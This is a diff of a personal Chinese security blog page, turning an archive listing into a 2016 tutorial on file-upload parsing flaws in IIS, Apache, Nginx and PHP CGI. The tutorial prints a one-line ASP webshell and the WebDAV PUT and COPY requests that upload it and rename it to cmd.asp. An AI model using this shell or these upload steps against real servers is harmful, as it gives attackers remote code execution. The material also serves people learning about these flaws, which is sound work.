@@ -3,17 +3,24 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Category: WEB | liuqi</title>
+  <title>文件上传之解析漏洞 | liuqi</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="春天的春，晴天的晴">
-<meta property="og:type" content="website">
-<meta property="og:title" content="liuqi">
-<meta property="og:url" content="http://yoursite.com/categories/WEB/page/2/index.html">
+  <meta name="description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat等```1## **IIS解析漏洞**
+IIS6.0在解析文件时存在以下两个解析漏洞1、当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。12
+WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传之解析漏洞">
+<meta property="og:url" content="http://yoursite.com/2016/08/11/文件上传之解析漏洞/index.html">
 <meta property="og:site_name" content="liuqi">
-<meta property="og:description" content="春天的春，晴天的晴">
+<meta property="og:description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat等```1## **IIS解析漏洞**
+IIS6.0在解析文件时存在以下两个解析漏洞1、当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。12
+WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
+<meta property="og:updated_time" content="2016-08-11T11:21:07.551Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="liuqi">
-<meta name="twitter:description" content="春天的春，晴天的晴">
+<meta name="twitter:title" content="文件上传之解析漏洞">
+<meta name="twitter:description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat等```1## **IIS解析漏洞**
+IIS6.0在解析文件时存在以下两个解析漏洞1、当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。12
+WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
   
     <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
   
@@ -62,215 +69,85 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="../../../../archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/22/xss实例/" class="archive-article-date">
-  <time datetime="2016-07-22T07:08:13.000Z" itemprop="datePublished">Jul 22</time>
+        <section id="main"><article id="post-文件上传之解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time datetime="2016-08-11T11:14:21.000Z" itemprop="datePublished">2016-08-11</time>
 </a>
-      
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/22/xss实例/">xss实例</a>
+    <h1 class="article-title" itemprop="name">
+      文件上传之解析漏洞
     </h1>
   
 
-    </header>
-  </div>
-</article>
-  
+      </header>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/18/xss的挖掘和利用/" class="archive-article-date">
-  <time datetime="2016-07-18T13:26:46.000Z" itemprop="datePublished">Jul 18</time>
-</a>
+    <div class="article-entry" itemprop="articleBody">
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/18/xss的挖掘和利用/">xss的挖掘和利用</a>
-    </h1>
-  
+        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>常见Web容器有IIS、Nginx、Apache、Tomcat等```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## **IIS解析漏洞**</div></pre></td></tr></table></figure>
+<p>IIS6.0在解析文件时存在以下两个解析漏洞<br>1、当建立<em>.asp、</em>.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。<br>2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
+<p>WebDav漏洞<br>    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若<br>支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</p>
+<p>测试步骤如下：<br>    1）通过OPTIONS探测服务器所支持的HTTP方法<br>    请求：<br>    OPTIONS / HTTP/1.1<br>    Host: www.xxxx.com<br>    2)通过PUT方法向服务器上传shell<br>    请求：<br>    PUT /a.txt HTTP/1.1<br>    Host: www.xxxx.com<br>    Content-Length: 30</p>
+<pre><code>&lt;%eval request(&quot;chopper&quot;) %&gt;
+3)通过Move或Copy方法改名
+请求：
+COPY /a.txt HTTP/1.1
+Host: www.xxxx.com
+Destination: http://www.xxxx.com/cmd.asp
+4)用DELETE方法删除文件
+请求：
+DELETE /a.txt HTTP/1.1
+Host: www.xxxx.com
+</code></pre><p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Apache解析漏洞*</div></pre></td></tr></table></figure></p>
+<p>在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件”/conf/mime.types”中配置Apache可以识别的文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Nginx解析漏洞*</div></pre></td></tr></table></figure></p>
+<p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *PHP CGI解析漏洞*</div></pre></td></tr></table></figure></p>
+<p>当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问<a href="http://www.xxx.com/x.txt/x.php" target="_blank" rel="external">http://www.xxx.com/x.txt/x.php</a><br>时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析</p>
+<p>IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php<br>Nginx中：任意文件名/任意文件名.php就会被解析为php<br>```</p>
 
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/18/google-hacking/" class="archive-article-date">
-  <time datetime="2016-07-18T12:07:37.000Z" itemprop="datePublished">Jul 18</time>
-</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/18/google-hacking/">google hacking</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/15/csrf漏洞发掘和利用/" class="archive-article-date">
-  <time datetime="2016-07-15T11:12:51.000Z" itemprop="datePublished">Jul 15</time>
-</a>
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cirq8inqh002058hrsk5ct6yn" class="article-share-link">Share</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/15/csrf漏洞发掘和利用/">csrf漏洞发掘和利用</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/13/sql注入步骤/" class="archive-article-date">
-  <time datetime="2016-07-13T02:28:00.000Z" itemprop="datePublished">Jul 13</time>
-</a>
+        <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/13/sql注入步骤/">sql注入步骤</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/07/渗透测试流程/" class="archive-article-date">
-  <time datetime="2016-07-07T00:58:31.000Z" itemprop="datePublished">Jul 7</time>
-</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/07/渗透测试流程/">渗透测试流程</a>
-    </h1>
-  
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/上传/">上传</a></li></ul>
 
-    </header>
+    </footer>
   </div>
-</article>
   
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/07/sql注入之盲注/" class="archive-article-date">
-  <time datetime="2016-07-07T00:35:30.000Z" itemprop="datePublished">Jul 7</time>
-</a>
-      
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/07/sql注入之盲注/">sql注入之盲注</a>
-    </h1>
   
+    <a href="../../08/centos搭建tomcat以及漏洞利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">centos搭建tomcat以及漏洞利用</div>
+    </a>
+  
+</nav>
 
-    </header>
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
   </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/06/sql注入报错注入/" class="archive-article-date">
-  <time datetime="2016-07-06T13:22:27.000Z" itemprop="datePublished">Jul 6</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/06/sql注入报错注入/">sql注入报错注入</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/06/sql注入联合查询/" class="archive-article-date">
-  <time datetime="2016-07-06T11:48:17.000Z" itemprop="datePublished">Jul 6</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/06/sql注入联合查询/">sql注入联合查询</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="../../../../2016/07/05/sql注入之sqlmap进行mysql注入root权限/" class="archive-article-date">
-  <time datetime="2016-07-05T10:32:52.000Z" itemprop="datePublished">Jul 5</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../../2016/07/05/sql注入之sqlmap进行mysql注入root权限/">sql注入之sqlmap进行mysql注入root权限</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-
-  <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="../../">&laquo; __('prev')</a><a class="page-number" href="../../">1</a><span class="page-number current">2</span><a class="page-number" href="../3/">3</a><a class="extend next" rel="next" href="../3/">__('next') &raquo;</a>
-  </nav>
+</section>
 </section>
         
           <aside id="sidebar">
@@ -279,7 +156,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="../../../linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="../../../安全/">安全</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/安全/">安全</a></li></ul>
     </div>
   </div>
 
@@ -321,23 +198,23 @@
       <ul>
         
           <li>
-            <a href="../../../../2016/08/11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
+            <a href="">文件上传之解析漏洞</a>
           </li>
         
           <li>
-            <a href="../../../../2016/08/08/centos搭建tomcat以及漏洞利用/">centos搭建tomcat以及漏洞利用</a>
+            <a href="../../08/centos搭建tomcat以及漏洞利用/">centos搭建tomcat以及漏洞利用</a>
           </li>
         
           <li>
-            <a href="../../../../2016/08/05/webshell的获取与查杀/">webshell的获取与查杀</a>
+            <a href="../../05/webshell的获取与查杀/">webshell的获取与查杀</a>
           </li>
         
           <li>
-            <a href="../../../../2016/08/05/redis漏洞利用/">redis漏洞利用</a>
+            <a href="../../05/redis漏洞利用/">redis漏洞利用</a>
           </li>
         
           <li>
-            <a href="../../../../2016/08/05/redis的安装/">redis的安装</a>
+            <a href="../../05/redis的安装/">redis的安装</a>
           </li>
         
       </ul>
@@ -369,11 +246,13 @@
 <script>
   var disqus_shortname = 'liuqi';
   
+  var disqus_url = 'http://yoursite.com/2016/08/11/文件上传之解析漏洞/';
+  
   (function(){
     var dsq = document.createElement('script');
     dsq.type = 'text/javascript';
     dsq.async = true;
-    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
     (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
   })();
 </script>
